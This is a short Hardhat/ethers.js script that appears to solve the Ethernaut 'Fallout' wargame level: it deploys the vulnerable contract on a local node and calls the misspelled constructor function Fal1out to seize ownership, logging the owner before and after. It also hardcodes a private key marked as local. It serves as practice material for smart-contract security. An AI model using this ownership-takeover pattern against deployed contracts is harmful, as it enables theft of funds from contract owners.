const { showThrottleMessage } = require("ethers");
const { ethers } = require("hardhat");

async function main () {
  const abi = [
    "function Fal1out() public payable",
    "function allocate() public payable",
    "function sendAllocation(address payable allocator) public",
    "function collectAllocations() public onlyOwner",
    "function allocatorBalance(address allocator) public view returns (uint256)"
  ]
  const [deployer] = await ethers.getSigners();
  const contract = await ethers.getContractFactory("Fallout");
  const deploycontract = await contract.deploy();
  const provier = new ethers.JsonRpcProvider("http://localhost:8545");
  const wallet = new ethers.Wallet("0x689af8efa8c651a91ad287602527f3af2fe9f6501a7ac4b061667b5a93e037fd", provier); //local private key
  const address = deploycontract.target;
  const connect = new ethers.Contract(address, abi, wallet);
  let owner = await deploycontract.owner();
  const eth = ethers.parseEther("1");


  console.log("Deployed contract at: ", deploycontract.target);
  console.log("Before contract owner: ", owner);

  await connect.Fal1out({value: eth});

  owner = await deploycontract.owner();

  console.log("After contract owner: ", owner);
  

  


}


main().catch((error) => {
  console.error(error);
  process.exit(1);
})
